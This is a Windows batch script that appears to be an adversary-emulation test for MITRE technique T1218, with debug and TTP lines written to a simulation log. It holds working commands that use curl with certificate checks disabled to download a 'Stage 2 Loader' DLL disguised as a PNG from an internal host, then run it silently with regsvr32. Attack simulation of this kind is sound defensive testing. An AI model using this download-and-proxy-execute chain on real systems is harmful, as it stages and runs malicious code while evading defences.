@echo off
setlocal enabledelayedexpansion

REM ── SET variable preamble ──────────────────────────────────────────────────
SET bvkrwm=BALAM-S2B
SET qlzxdn=7
SET fwptcj=%APPDATA%\7\macula-simulations.log
SET hsnrye=%APPDATA%\10417\56f42144
SET gdmxkp=eea4c6c1.txt
SET ztjwqb=10417
SET cnvlhf=https://10.0.0.49/stage/2/icon.png?10417-7
SET rpxoui=%APPDATA%\7

REM ── Cache timestamp once at script start ───────────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── Debug: script_start ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: script_start>> "!fwptcj!" 2>nul

REM ── Debug: heartbeat_start ─────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: heartbeat_start>> "!fwptcj!" 2>nul

REM ── Heartbeat fetch — downloads Stage 2 Loader DLL to disk ────────────────
curl -k -s -o "!hsnrye!\!gdmxkp!" "!cnvlhf!"
SET _hb_err=!ERRORLEVEL!

REM ── Debug: heartbeat_complete ──────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: heartbeat_complete=!_hb_err!>> "!fwptcj!" 2>nul

REM ── Debug: chdir_start ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: chdir_start>> "!fwptcj!" 2>nul

REM ── Change working directory to output dir ─────────────────────────────────
cd /d "!hsnrye!" >nul 2>&1
SET _cd_err=!ERRORLEVEL!

REM ── Debug: chdir_result ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: chdir_result=!_cd_err!>> "!fwptcj!" 2>nul

REM ── Debug: dll_load ───────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: dll_load>> "!fwptcj!" 2>nul

REM ── Debug: rundll32_start (regsvr32 invocation) ───────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: regsvr32_start>> "!fwptcj!" 2>nul

REM ── T1218 — System Binary Proxy Execution via regsvr32 ────────────────────
REM LOLBIN: regsvr32.exe /s <DLL>  — executes DllRegisterServer silently
regsvr32.exe /s "!gdmxkp!"
SET _lolbin_err=!ERRORLEVEL!

REM ── Debug: command_execution_result ───────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: command_execution=!_lolbin_err!>> "!fwptcj!" 2>nul

REM ── Refresh timestamp for TTP log line ────────────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── Per-TTP log line emit — T1218 System Binary Proxy Execution ───────────
IF !_lolbin_err! EQU 0 (
    echo [!tsvar!][TTP][!bvkrwm!][!ztjwqb!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!fwptcj!" 2>nul
) ELSE (
    IF !_lolbin_err! EQU 2 (
        echo [!tsvar!][TTP][!bvkrwm!][!ztjwqb!]: T1218^|System Binary Proxy Execution=[FAIL]:[dll_not_found]>> "!fwptcj!" 2>nul
    ) ELSE (
        echo [!tsvar!][TTP][!bvkrwm!][!ztjwqb!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!fwptcj!" 2>nul
    )
)

REM ── Debug: script_end ──────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwm!][!ztjwqb!]: script_end>> "!fwptcj!" 2>nul

endlocal